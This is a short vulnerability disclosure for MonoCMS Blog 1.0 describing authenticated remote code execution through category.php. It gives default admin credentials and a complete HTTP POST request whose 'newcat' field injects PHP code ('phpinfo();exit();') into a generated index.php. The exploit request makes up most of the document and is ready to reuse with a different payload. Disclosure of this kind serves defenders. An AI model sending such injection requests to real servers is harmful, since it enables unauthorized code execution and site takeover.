# MonoCMS Blog 1.0_remote_code_execution

## Detail:
At monofiles```/category.php:27```, user input was saved to category/[foldername]/index.php causing RCE.

![image](https://github.com/fortest-1/vuln/blob/main/MonoCMS%20Blog/img/3.png?raw=true)




## POC:
My env
MonoCMS Blog 1.0
php 5.6.9
Windows

category rce 
At monofiles/category.php:27, user input was saved to category/[foldername]/index.php causing RCE.

First Step:
Login to your account(default:admin/1234) 

Send an request:
```
POST /monofiles/category.php HTTP/1.1
Host: 172.16.105.29
Content-Length: 68
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.16.105.29
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.16.105.29/monofiles/category
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: MON=r1u4c0k2mv2c222linpoma712m
Connection: close

newcat=test";phpinfo();exit();//&foldername=test
```


Visit ```/category/test/index``` to successfully execute the code
![image](https://github.com/fortest-1/vuln/blob/main/MonoCMS%20Blog/img/1.png?raw=true)
![image](https://github.com/fortest-1/vuln/blob/main/MonoCMS%20Blog/img/2.png?raw=true)



 

 



 
